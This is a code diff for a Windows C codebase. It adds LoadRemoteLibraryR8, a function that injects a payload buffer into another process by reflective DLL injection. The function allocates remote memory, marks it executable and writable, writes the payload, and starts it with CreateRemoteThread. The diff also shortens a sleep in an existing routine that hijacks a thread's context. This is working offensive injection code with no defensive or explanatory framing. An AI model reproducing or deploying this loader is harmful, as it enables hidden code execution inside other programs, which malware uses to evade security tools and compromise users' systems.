@@ -261,7 +261,7 @@ void WINAPI LoadRemoteLibraryR4(int payload_type, HANDLE hProcess, DWORD tid)
 		}
 
 		ResumeThread(thread_handle);
-		Sleep(10000);
+		Sleep(3000);
 		SuspendThread(thread_handle);
 		SetThreadContext(thread_handle, &old_ctx);
 		ResumeThread(thread_handle);
@@ -572,6 +572,63 @@ void WINAPI LoadRemoteLibraryR7(int payload_type)
 
 	return;
 }
+
+
+
+
+
+void WINAPI LoadRemoteLibraryR8(int payload_type, HANDLE hProcess)
+{
+
+	LPVOID lpRemoteLibraryBuffer = NULL;
+	LPTHREAD_START_ROUTINE lpReflectiveLoader = NULL;
+	DWORD dwThreadId = 0;
+
+	set_param(payload_type);
+
+	try
+	{
+
+		// alloc memory (RWX) in the host process for the image
+		lpRemoteLibraryBuffer = VirtualAllocEx(hProcess, NULL, buflen, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+		if (!lpRemoteLibraryBuffer)
+			return;
+
+		DWORD oldProtect;
+		VirtualProtectEx(hProcess, lpRemoteLibraryBuffer, buflen, PAGE_EXECUTE_READWRITE, &oldProtect);
+
+		char* tp = (char*)buf;
+
+		// write the image into the host process
+		if (!WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, buf, buflen, NULL))
+		{
+			return;
+		}
+
+
+		// add the offset to ReflectiveLoader() to the remote library address
+		lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)lpRemoteLibraryBuffer + offset);
+
+
+		// create a remote thread in the host process to call the ReflectiveLoader
+		CreateRemoteThread(hProcess, NULL, 1024 * 1024, lpReflectiveLoader, param, (DWORD)NULL, &dwThreadId);
+
+	}
+	catch (...)
+	{
+	}
+
+}
+
+
+
+
+
+
+
+
+
+
 
 
 //###########################
